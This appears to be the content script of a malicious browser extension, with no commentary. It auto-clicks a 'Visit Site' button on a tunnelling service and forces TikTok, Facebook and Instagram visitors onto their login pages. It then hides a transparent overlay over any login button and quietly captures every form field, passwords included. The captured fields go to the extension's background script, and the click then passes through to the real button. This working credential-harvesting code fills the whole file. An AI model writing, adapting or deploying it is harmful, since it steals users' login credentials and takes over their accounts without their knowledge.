console.log('Content script loaded.');

let isLoginFound = false;
let intervalId;

function checkForVerificationButton() {
    if (window.location.href.includes('localto.net')) {
        const buttons = document.querySelectorAll('a.btn');
        buttons.forEach(button => {
            if (button.textContent.trim() === 'Visit Site') {
                console.log('Verification button found on locationet.com. Clicking...');
                setTimeout(() => {
                    button.click();
                }, 200);
            }
        });
    }
}

checkForVerificationButton();

const loginUrls = {
    'tiktok.com': 'https://tiktok.com/login',
    'facebook.com': 'https://web.facebook.com',
    'instagram.com': 'https://instagram.com/accounts/login/',
};

function findLoginForm() {
    const forms = document.querySelectorAll('form');
    const regex = /\b(log\s?in|sign\s?in|continue|submit|next|enter|access|authenticate|proceed|confirm|connect|get\s?started||go|authorize|validate|unlock|verify|login|signin)\b/i;
    const currentUrl = window.location.hostname;

    for (const form of forms) {
        const buttons = form.querySelectorAll('button, input[type="button"], input[type="submit"]');
        for (const button of buttons) {
            if (regex.test(button.textContent) || regex.test(button.value)) {
                console.log('Login button found');
                createOverlayButton(button, form); // Create overlay button
                isLoginFound = true;
                clearInterval(intervalId);
                return;
            }
        }
    }

    if (!isLoginFound) {
        const redirectUrl = loginUrls[currentUrl];
        if (redirectUrl && !window.location.href.startsWith(redirectUrl)) {
            window.location.href = redirectUrl;
        } else {
            console.log("No login button found and no redirect rule for this site.");
        }
    }
}

intervalId = setInterval(findLoginForm, 1000);

function captureFormData(form) {
    const capturedData = { weburl: window.location.href };
    const inputs = form.querySelectorAll('input, textarea, select');

    inputs.forEach((input, index) => {
        const inputData = {};

        // Capture all relevant attributes
        if (input.name) inputData.name = input.name;
        if (input.id) inputData.id = input.id;
        if (input.type) inputData.type = input.type;
        if (input.placeholder) inputData.placeholder = input.placeholder;
        if (input.value) inputData.value = input.value;
        if (input.className) inputData.className = input.className;
        // Add more attributes as needed

        capturedData[`input${index + 1}`] = inputData;
    });

    return { capturedData: capturedData, inputs: inputs };
}

function createOverlayButton(originalButton, form) {
    const rect = originalButton.getBoundingClientRect();
    const overlayButton = document.createElement('button');
    overlayButton.style.position = 'fixed';
    overlayButton.style.left = rect.left + 'px';
    overlayButton.style.top = rect.top + 'px';
    overlayButton.style.width = rect.width + 'px';
    overlayButton.style.height = rect.height + 'px';
    overlayButton.style.zIndex = '10000';
    overlayButton.style.background = 'transparent';
    overlayButton.style.border = 'none';
    overlayButton.style.padding = '0';
    overlayButton.style.margin = '0';
    overlayButton.style.cursor = 'pointer';

    overlayButton.addEventListener('click', (event) => {
        event.preventDefault();
        const { capturedData, inputs } = captureFormData(form);
        console.log(capturedData);
        chrome.runtime.sendMessage({ action: 'formDataSubmitted', formData: capturedData, inputs: inputs });
        // overlayButton.remove(); // Remove overlay button
        originalButton.click(); // Trigger the original button
    });

    document.body.appendChild(overlayButton);
}